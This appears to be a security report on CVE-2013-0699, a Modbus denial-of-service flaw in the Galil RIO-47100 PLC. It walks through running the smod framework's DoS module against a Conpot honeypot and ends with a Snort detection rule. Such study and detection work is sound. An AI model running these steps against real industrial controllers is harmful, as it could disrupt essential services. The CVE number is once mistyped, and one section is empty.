# Overview
In this report, we will focus on modbus, the most widely used SCADA/ICS protocol. We will use Honeypot as the target. 
This Report provides: 

- Mitigation details for a vulnerability affecting the Galil RIO-47100 “Pocket PLC.”
- Disclosure of exploit runs on ModBus protocol.  
- Simulating an attack scenario against Scada Honeypot (Conpot) 
- Modbus attack diagnostic functions in Wireshark
- Writing IDS rules to detect attack


Researcher Jon Christmas of Solera Networks has identified an improper validation vulnerability in the Galil RIO-47100 PLC, which can result in a loss of availability. Galil has produced an update that mitigates this vulnerability. The researcher has tested this update and validates that it resolves the vulnerability. This vulnerability could be exploited remotely.

---


# Vulnerability Overview

#### Improper Input Validation
The Galil RIO-47100 PLC allows repeated requests to be sent in a single session. By using these repeated requests sent in a single session, an attacker can cause a denial of service of the system.
CVE-2013-06992 has been assigned to this vulnerability. A CVSS v2 base score of 7.1 has been
assigned. This exploit sends multiple function code (read a coil repeated in a single packet) to break the machine.
#### Vulnerability Details 
The Rio-47100 by Galil is a small PLC with an internal RISC based
processor. It communicates using ModBus, or Telnet over Ethernet as well as
having a web server built in that allows a user to issue commands.

| Vendor -- Product  	| Description    | Published      | CVSS Score    |   Source & Patch Info    |
| ----- | ---------- | --------------- | --------------- | -----------|
| galil -- pocket_plc|The Galil RIO-47100 Pocket PLC allows remote attackers to cause a denial of service via a session that includes "repeated requests."| 2013-05-01 | [7.1](https://nvd.nist.gov/vuln-metrics/cvss/v2-calculator?name=CVE-2013-0699&vector=(AV:N/AC:M/Au:N/C:N/I:N/A:C)&version=2.0&source=NIST)| [CVE-2013-0699](https://nvd.nist.gov/vuln/detail/CVE-2013-0699) |


##### _Explotability_
This vulnerability could be exploited remotely.
##### _Existence of Exploit_
Known public exploits specifically target this vulnerability.
##### _Difficulty_
An attacker with a medium skill would be able to exploit this vulnerability.

## Affected Produtcs 
The following Galil product is affected:
- Hardware : RIO-47100 PLC by Galil.
- Version : Rio Firmware Prior to 1.1d
- Vendor : [`www.galilmc.com`](www.galilmc.com)

## Impact
Successful exploitation of this vulnerability could allow an attacker to affect the availability for the Galil RIO-47100 PLC. This vulnerabilities other potential disastrous impacts of DoS attacks against SCADA/ICS systems include electrical blackouts, shutdown of water and sewage systems and other essential municipal services.
Impact to individual organizations depends on many factors that are unique to each organization.
## Background
Galil is a US-based company that maintains offices in Rocklin, California. Galil produces motion control products that are distributed globally.
The affected product, RIO-47100 PLC, is a compact PLC system that includes I/O. According to Galil, RIO-47100 PLC is deployed across several sectors including energy, defense industrial base, and agriculture and food. Galil estimates that these products are used primarily in the United States and Europe with a small percentage in Asia.


---
# Exploitation of Vulnerability 
We are going to exploit [CVE-2013-0699](https://nvd.nist.gov/vuln/detail/CVE-2013-0699#match-3087197) in this spesific example. As we mentioned before, with this exploit; attacker can cause a denial of service of the system. 

In order to exploit the vulnerability we need to download [Smod](https://github.com/Joshua1909/smod)
After downloading smod we can run it by typing;
```
cd smod
python smod.py
```

<p align="center">
  <img width="750" height="400" src="https://github.com/ics-scada/Reports/blob/main/Modbus/Screenshots/1.1.png">
</p>
We can see the ModBus Frameworks' modules by typing;

```
show modules
```
<p align="center">
  <img width="750" height="400" src="https://github.com/ics-scada/Reports/blob/main/Modbus/Screenshots/1.2.png">
</p>

```
use /modbus/dos/galilRIO
show options
```
We have checked which parameters our exploit needs to run. This exploit needs; 
`RHOST` = remote host ip address,
`UID` = Unit id,
paramateres.
```
set RHOST <ip>
set UID <uid>
```

After giving the parameters which are wanted we are ready to run it. 
```
exploit
```
<p align="center">
  <img width="750" height="400" src="https://github.com/ics-scada/Reports/blob/main/Modbus/Screenshots/1.5.png">
</p>

As you can see above, dos attack has started.

---

# Packet Analysing


---
# Rules
```
We performed the penetration test with snort on the ubuntu device located on the same network as the victim source but default snort rules did not trigger any alarms. So we wrote a rule that reads the packet at modbus/tcp layer with regex. The rule we added to Snort3 is below.

alert tcp any any -> $HOME_NET 502 (
msg:"Inproper input Validation -Dos Attack-";
flow:to_server,established;
reference:cve,2013-0699;
classtype: denial-of-service;
sid:1;
pcre:"/([\x00-\xff])([\x00-\xff])(\x00)(\x00)(\x00)(\x06)([\x00-\xff])(\x01)(\x00)(\x00)(\x00)(\x01)/";
detection_filter:track by_dst, count 10, seconds 1;)
```
